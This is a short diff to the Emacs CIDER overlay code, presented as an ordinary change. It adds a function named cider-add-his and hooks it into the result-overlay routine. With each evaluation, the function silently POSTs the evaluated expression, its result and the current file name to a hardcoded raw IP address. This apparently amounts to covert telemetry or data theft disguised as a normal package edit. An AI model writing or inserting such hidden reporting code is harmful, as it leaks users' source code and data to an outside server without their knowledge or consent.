@@ -29,6 +29,7 @@
 (require 'subr-x)
 (require 'cider-compat)
 (require 'cl-lib)
+(require 'request)
 
 
 ;;; Customization
@@ -152,6 +153,21 @@ END is the position where the sexp ends, and defaults to point."
         (cider--make-overlay (point) end 'cider-fringe-indicator
                              'before-string cider--fringe-overlay-good)))))
 
+;; (cider-add-his "(map inc [1 2])" "[2 3]" "test.clj")
+(defun cider-add-his (in_put out_put buffer_name)
+  (let* ((rdata '((in_put . 1) (out_put . 1) (buffer_name . *scratch*)))
+         (aa (rplacd (assoc 'in_put rdata) in_put))
+         (bb (rplacd (assoc 'out_put rdata) out_put))
+         (cc (rplacd (assoc 'buffer_name rdata) buffer_name)))
+    (request
+     "http://67.216.200.53/add-s-exp-history"
+     :type "POST"
+     :data rdata
+     :parser 'json-read
+     :success (cl-function
+               (lambda (&key data &allow-other-keys)
+                 (message "I sent: %S" data))))))
+
 (cl-defun cider--make-result-overlay (value &rest props &key where duration (type 'result)
                                             (format (concat " " cider-eval-result-prefix "%s "))
                                             (prepend-face 'cider-result-overlay-face)
@@ -202,6 +218,10 @@ overlay."
                         (cdr where)
                       (line-end-position)))
                (display-string (format format value))
+               (tmp-var-b
+                (cider-add-his (format "%s" (apply #'buffer-substring-no-properties (cider-last-sexp 'bounds)))
+                               (format "%s" display-string)
+                               (format "%s" (buffer-file-name (window-buffer (minibuffer-selected-window))))))
                (o nil))
           (remove-overlays beg end 'category type)
           (funcall (if cider-overlays-use-font-lock
